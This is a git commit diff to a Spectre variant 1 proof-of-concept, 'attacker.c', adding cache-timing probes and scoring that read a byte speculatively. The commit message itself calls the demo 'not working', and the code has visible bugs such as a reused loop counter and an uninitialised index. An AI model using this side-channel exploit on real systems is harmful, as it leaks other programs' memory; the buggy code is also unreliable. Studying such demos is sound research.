1e9b40516c35480fc3777c222292506ddbd1fae1
Sephrost <sephrost@github.com>
2023-05-08 23:57:00 +0200

    Implemented full not  working demo

--- Spectrev1/attacker.c
+++ Spectrev1/attacker.c
@@ -15,9 +15,9 @@
 #define L1_CACHE_LINE_SIZE 64
 #endif
 
-#define CACHE_HIT_TRESHOLD 80
+#define CACHE_HIT_THRESHOLD 80
 #define ARRAY1_SIZE 16
-#define TRIES 1000
+#define TRIES 100
 
 
 void exit(int status);
@@ -39,23 +39,36 @@ int results[256];
 uint8_t temp = 0; /* To not optimize out victim_function() */
 
 void victim_function(size_t x){
+	// TODO: check if it's possible to hardcode x
 	if(x < array1_size){
 		temp &= array2[array1[x] * 512];
 	}
 }
 
-int probe_memory_byte(size_t offset){
+static inline int get_access_time(volatile uint8_t *addr){
+	unsigned int junk = 0;
+	register uint64_t time1, time2;
+	time1 = __rdtscp(&junk);
+	junk = *addr; // access addr
+	time2 = __rdtscp(&junk) - time1;
+	return time2;
+}
+
+void probe_memory_byte(size_t offset, int * value, int * score){
+	int tries, mix_i ,k,j,i;
 	size_t training_x, x;
+	volatile uint8_t * addr;
+	unsigned int junk = 0;
   memset(results, 0, sizeof(results));
   
-  for(int i=0; i<TRIES; i++){
+  for(i=0; i<TRIES; i++){
 		// flush the whole array2 from cache
-    for (int j=0; j<256; j++){
+    for (j=0; j<256; j++){
       _mm_clflush(&array2[j*512]);
     }
 		// 5 training runs for each attack run
 		training_x = i % array1_size;
-    for (int j = 29; j >= 0; j--) {
+    for (j = 29; j >= 0; j--) {
       _mm_clflush( & array1_size); // flush the array1_size from cache to force a cache miss
 			_mm_mfence(); // delay to ensure that the clflush is finished
 
@@ -69,8 +82,34 @@ int probe_memory_byte(size_t offset){
       /* Call the victim! */
       victim_function(x);
     }
+
+		/* Time reads. Mixed-up order to prevent stride prediction */
+		for (i = 0; i < 256; i++) {
+			mix_i = ((i * 167) + 13) & 255;
+			if (get_access_time(&array2[mix_i * 512]) <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
+				results[mix_i]++; /* cache hit -> score +1 for this value */
+		}
+		/* Locate highest & second-highest results results tallies in j/k */
+    j = k = -1;
+    for (i = 0; i < 256; i++) {
+      if (j < 0 || results[i] >= results[j]) {
+        k = j;
+        j = i;
+      } else if (k < 0 || results[i] >= results[k]) {
+        k = i;
+      }
+    }
+    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
+      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
   }
-}
+  value[0] = (uint8_t) j;
+  score[0] = results[j];
+  value[1] = (uint8_t) k;
+  score[1] = results[k];
+  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
+	printf("value[0]: %d, score[0]: %d\n", value[0], score[0]);
+}	
+
 
 int main(int argc,char** argv){
   // print argv 
@@ -78,12 +117,13 @@ int main(int argc,char** argv){
 
   uint8_t* secret_ptr = argv[0];
   uint8_t size = atoi(argv[1]);
+	int value[2], score[2];
 
 	size_t offset = (secret_ptr - (uint8_t*)array1);
 
 	printf("secret_ptr: %p, size: %d\n, array1: %p ,offset %d\n", secret_ptr, size, array1, offset);
 
-	probe_memory_byte(offset);
-
+	probe_memory_byte(offset,value,score);
+	printf("value[0]: %d, score[0]: %d\n", value[0], score[0]);
   
 }
